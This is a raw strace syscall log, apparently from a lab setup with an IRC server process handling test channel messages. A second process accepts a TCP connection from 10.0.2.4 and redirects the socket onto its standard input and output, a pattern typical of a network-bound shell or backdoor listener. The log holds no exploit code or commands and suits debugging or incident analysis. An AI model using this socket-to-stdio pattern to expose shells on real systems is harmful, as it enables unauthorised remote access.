4519  07:33:35.115488 recv(9, "PRIVMSG  #testit3 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  07:33:35.115549 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115565 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115580 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115594 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115608 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115636 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115649 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115663 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115676 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115689 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115703 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115716 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115729 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115742 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115755 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115769 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115782 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115795 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115808 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115822 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115835 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115848 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115863 time(NULL)        = 1495625615
4519  07:33:35.115872 time(NULL)        = 1495625615
4519  07:33:35.115895 gettimeofday({1495625615, 115899}, NULL) = 0
4519  07:33:35.115907 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:33:35.115935 clock_gettime(CLOCK_MONOTONIC, {2424, 932948138}) = 0
4519  07:33:35.115946 gettimeofday({1495625615, 115949}, NULL) = 0
4519  07:33:35.115956 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
10563 07:33:35.432362 <... accept resumed> {sa_family=AF_INET, sin_port=htons(43697), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
10563 07:33:35.432418 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5558) = -1 EINVAL (Invalid argument)
10563 07:33:35.432434 _llseek(8, 0, 0xbfbc55a0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10563 07:33:35.432446 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5558) = -1 EINVAL (Invalid argument)
10563 07:33:35.432457 _llseek(8, 0, 0xbfbc55a0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10563 07:33:35.432467 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
10563 07:33:35.432510 close(6)          = 0
10563 07:33:35.432579 dup(8)            = 6
10563 07:33:35.432593 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc63f8) = -1 EINVAL (Invalid argument)
10563 07:33:35.432605 _llseek(6, 0, 0xbfbc6440, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10563 07:33:35.432615 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
10563 07:33:35.432655 dup2(6, 1)        = 1
10563 07:33:35.432723 close(6 <unfinished ...>
4519  07:33:35.432739 <... select resumed> ) = 1 (in [5], left {0, 690000})
10563 07:33:35.432764 <... close resumed> ) = 0
4519  07:33:35.432806 clock_gettime(CLOCK_MONOTONIC,  <unfinished ...>
10563 07:33:35.432813 fcntl64(1, F_SETFD, 0 <unfinished ...>
4519  07:33:35.432834 <... clock_gettime resumed> {2425, 249826897}) = 0
10563 07:33:35.432840 <... fcntl64 resumed> ) = 0
4519  07:33:35.432868 recv(5,  <unfinished ...>
10563 07:33:35.432873 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
4519  07:33:35.432880 <... recv resumed> 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
10563 07:33:35.432886 <... ioctl resumed> , 0xbfbc63c8) = -1 EINVAL (Invalid argument)
4519  07:33:35.432895 getsockopt(5, SOL_SOCKET, SO_ERROR <unfinished ...>
10563 07:33:35.432900 _llseek(1, 0,  <unfinished ...>
4519  07:33:35.432906 <... getsockopt resumed> , [0], [4]) = 0
10563 07:33:35.432912 <... _llseek resumed> 0xbfbc6410, SEEK_CUR) = -1 ESPIPE (Illegal seek)
4519  07:33:35.432952 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0 <unfinished ...>
10563 07:33:35.432963 dup(8 <unfinished ...>
4519  07:33:35.432970 <... send resumed> ) = -1 EPIPE (Broken pipe)
10563 07:33:35.432975 <... dup resumed> ) = 6
4519  07:33:35.432982 --- SIGPIPE (Broken pipe) @ 0 (0) ---
10563 07:33:35.433009 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
4519  07:33:35.433022 close(5 <unfinished ...>
10563 07:33:35.433026 <... ioctl resumed> , 0xbfbc63f8) = -1 EINVAL (Invalid argument)
4519  07:33:35.433033 <... close resumed> ) = 0
10563 07:33:35.433038 _llseek(6, 0,  <unfinished ...>
4519  07:33:35.433048 gettimeofday( <unfinished ...>
10563 07:33:35.433052 <... _llseek resumed> 0xbfbc6440, SEEK_CUR) = -1 ESPIPE (Illegal seek)
4519  07:33:35.433059 <... gettimeofday resumed> {1495625615, 433057}, NULL) = 0
10563 07:33:35.433066 fstat64(6,  <unfinished ...>
4519  07:33:35.433073 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
10563 07:33:35.433096 <... fstat64 resumed> {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
10563 07:33:35.433111 dup2(6, 0)        = 0
10563 07:33:35.433121 close(6)          = 0
10563 07:33:35.433131 fcntl64(0, F_SETFD, 0) = 0
10563 07:33:35.433145 fcntl64(0, F_SETFD, 0) = 0
10563 07:33:35.433160 read(0,  <unfinished ...>
4519  07:33:35.635341 <... select resumed> ) = 1 (in [4], left {0, 790000})
4519  07:33:35.635341 clock_gettime(CLOCK_MONOTONIC, {2425, 452350487}) = 0
4519  07:33:35.635342 recv(4, "PRIVMSG  #testit ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 44
4519  07:33:35.635342 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635342 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635342 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635344 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635359 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635373 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635387 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635400 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635413 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635427 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635440 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635453 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635467 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635480 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635494 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635507 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635520 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635541 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635555 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635599 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635651 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635682 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.635697 time(NULL)        = 1495625615
4519  07:33:35.635707 time(NULL)        = 1495625615
4519  07:33:35.635719 gettimeofday({1495625615, 635722}, NULL) = 0
4519  07:33:35.635730 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:33:35.635758 clock_gettime(CLOCK_MONOTONIC, {2425, 452771420}) = 0
4519  07:33:35.635769 gettimeofday({1495625615, 635772}, NULL) = 0
4519  07:33:35.635779 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 970000})
4519  07:33:35.665150 clock_gettime(CLOCK_MONOTONIC, {2425, 482168322}) = 0
4519  07:33:35.665169 recv(4, "PRIVMSG  #testit ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 70
4519  07:33:35.665191 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665207 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665222 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665237 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665250 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665265 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665278 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665292 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665306 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665319 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665333 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665347 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665360 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665374 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665388 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665401 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665415 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665428 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665442 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665456 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665469 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665483 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.665499 gettimeofday({1495625615, 665503}, NULL) = 0
4519  07:33:35.665511 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
10563 07:33:35.950169 <... read resumed> "", 4096) = 0
10563 07:33:35.950363 close(8)          = 0
10563 07:33:35.950506 exit_group(0)     = ?
